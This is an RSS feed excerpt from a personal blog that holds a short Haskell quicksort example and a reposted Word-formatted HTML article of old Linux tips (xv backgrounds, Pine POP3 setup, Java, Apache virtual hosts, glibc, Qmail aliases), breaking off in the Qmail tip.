<![CDATA[<b>快速排序</b><br>$ cat &gt; qsort.hs&lt;&lt;EOF<br>#!/usr/bin/runghc6<br>quicksort [] = []<br>quicksort (x:xs) = <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let smallSet = quicksort [a | a&lt;-xs, a&lt;=x]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bigSet = quicksort [a | a&lt;-xs, a&gt;x]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; in smallSet ++ [x] ++ bigSet<br>main = do&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; let hi=quicksort [4,3,2,8,12,1,7,6,5,24,10]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print hi<br>EOF<br>$ chmod +x qsort.hs<br>$ ./qsort.hs<br>[1,2,3,4,5,6,7,8,10,12,24]<br>todo]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720101113247379/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]100-Linux-Tips-And-Tricks-2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832521413399/</link>
      <description>
<![CDATA[<H1 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="3" >1.</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="3" >Software</FONT></SPAN></SPAN></A></H1>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Software is what makes the system work. Without software, a computer system would be useless. We cover</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >important software issues here, and how small programs found on remote Web sites can solve most of your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >problems.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.1</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 1: Background image in X Window</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By default, the background in X Window is a grey background. Some window managers have their own</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >options to set other backgrounds, and some don't.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A program you can use to set your background is a program that comes with most Linux distributions. It's</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >called XV, and you can specify which background image you want with this line:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >xv -quit -root image.gif</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will set the background to be the image.gif file. You can add that line in your .xinitrc file, in your home</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >directory, so it is executed each time you launch X Window.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.2</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 2: Customize Netscape Communicator</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Netscape Communicator has one nice feature that few people use. When you download it, it has a Personal</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Toolbar with buttons that most of us may not find really useful, so we either turn it off or don't look at it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >I found it to be a much more useful tool than the Bookmarks. What appears on that bar is simply what's</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >inside the Personal Folder inside your Bookmarks.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can ceate folders in it for news sites, Linux sites, etc and move your bookmarks into them (with the Edit</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Bookmarks option).</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You then have your own personal portal in your browser:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.3</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 3: POP3 in Pine</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Many Linux users use Pine as their mail client. Lets see how you can use Pine both with local mail and with</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >POP3 mail, without using fetchmail or some other tool to get POP mail first.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First you will want to use multiple config files:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >pine -p localmail</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >pine -p popserver1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >pine -p popserver2</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You need to configure Pine to use your POP3 server. In the program go to Setup, Config. You'll want to set</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >something like this in your inbox-path:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >{pop.server.com/pop3/user=myid}INBOX</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Now restart Pine and it will ask you for your password and connect to the remote server, and use it just like if</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you were accessing local mail.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.4</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 4: Multiple accounts in Pine</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can use multiple POP3, IMAP or other incoming mail accounts in the same config file by editing the line</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >"incoming-folders=" from .pinerc in your local home directory.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The syntax is:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >incoming-folders= "Nick1" {pop1.domain.com/pop3/user=login}INBOX,</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >"Nick2" {pop2.somewhere.com/pop3/user=login}INBOX</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will create a new collection in Pine with these folders in it, plus the mail folder on the local system.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.5</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 5: Running Java programs</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Java is an interpreted language. Usualy Java is found on the Web, in small programs called applets. But many</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Java applications exist. They are like applets, but require a Java Virtual Machine to run on your system.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Netscape Communicator and any Java-enabled browser can run Java applets, but what if you want to run Java</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >programs?</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Java programs are files ending with .class and must be run in a JVM. The Java Development Kit comes with</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >a JVM. What you need is the Linux port of the JDK that you can find at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.blackdown.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. Once</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >installed, you can run any Java application using the line:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; COLOR: black; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >java Program</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Where java is the JVM, from the JDK package, and Program is the class found inside the Program.class file.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that you do not have to specify the .class part of the file to run it.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.6</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 6: Virtual hosts in Apache</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Apache, the popular Web server for Linux and Unix, allows you to host virtual hostnames with multiple IP</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >addresses. You can set one IP to each hostname. But what if you want to host multiple hostnames on a single</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >IP? Apache allows you to do it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is a single command that goes in the httpd.conf configuration file:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >NameVirtualHost 1.2.3.4</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Replacing 1.2.3.4 with your real IP address, this will allow Apache to know on which IP it should serve the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >virtual hostnames. Then you can add the virtual commands for every hostname you want to host:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >&lt;VirtualHost virtual.host.com&gt;</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ServerAdmin webmaster@virtual.host.com</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >DocumentRoot /home/httpd/virtual</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ServerName virtual.host.com</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >&lt;/VirtualHost&gt;</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will add virtual.host.com in your list of virtual hosts and serve the pages in /home/httpd/virtual. Of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >course you need to have the actual virtual.host.com hostname pointing to that system.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.7</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 7: Libc versus Glibc</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A few years ago, every Linux system used the libc version 5.x library. The libc library is the main library that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >all Unix C programs use. The functions they access are defined in that library.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Recently a new version of the library was introduced by the GNU project called GNU libc, or glibc, which is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >also called libc 6. Some distributions and older systems won't have glibc, and they won't support glibc</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >binaries. This doesn't change anything for binaries you compile, but binaries you download that are linked to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the GNU libc will not work.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There are 2 ways to get them to work. The first is to upgrade. You can upgrade to a newer version that does</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >support glibc, or change your distribution to one that already has glibc as its main library. The other way is to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >install glibc on your current system. This requires you to know what you are doing and to backup your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >system first. See the GNU page at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.gnu.org </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >page for more information on GNU products.</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.8</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 8: Aliases with Qmail</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Qmail is a mail program that allows users to send and receive emails. It also has a lot of good features, one of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >them being aliases. You can add aliases to users who do not have an account on the system. Here is how to do</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >it:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Create an account called "alias" if it doesn't exist, and go in its home directory.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  